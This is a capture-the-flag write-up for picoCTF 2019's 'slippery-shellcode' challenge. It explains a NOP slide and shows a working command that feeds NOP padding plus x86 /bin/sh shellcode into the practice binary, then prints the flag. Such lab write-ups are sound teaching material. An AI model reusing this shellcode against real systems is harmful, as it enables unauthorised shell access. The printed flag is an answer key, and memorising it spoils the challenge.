# slippery-shellcode
#### This [program](https://2019shell1.picoctf.com/static/2ea6c02873caad85c8b9f9cb1c704bef/vuln) is a little bit more tricky. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/slippery-shellcode_3_68613021756bf004b625d7b414243cd8 on the shell server. [Source](https://2019shell1.picoctf.com/static/2ea6c02873caad85c8b9f9cb1c704bef/vuln.c).

Looking at the source code we see that the code executes the shellcode from a random location. To bypass this we can use a [nop slide](https://en.wikipedia.org/wiki/NOP_slide).
A nop slide allows us to ignore the starting location by having the program start at a nop and slide to our shell code. It doesn't matter where the code starts executing because
it will end at the same place. To do this we can use the same shellcode used in [handy-shellcode](https://github.com/Supermac30/PicoCTF-2019/tree/master/Binary%20Exploitation/handy-shellcode), 
add a lot of NOPs as padding, which in intel x86 is 0x90, and use cat to keep the shell open.

```
Supermac30@pico-2019-shell1:/problems/slippery-shellcode_3_68613021756bf004b625d7b414243cd8$ (python -c 'print "\x90"*300+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"';cat) | ./vuln
Enter your shellcode:
��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin��P��S��
                                                                                  ̀
Thanks! Executing from a random location now...
cat flag.txt
picoCTF{sl1pp3ry_sh311c0d3_de21cb07}
```

Flag: picoCTF{sl1pp3ry_sh311c0d3_de21cb07}
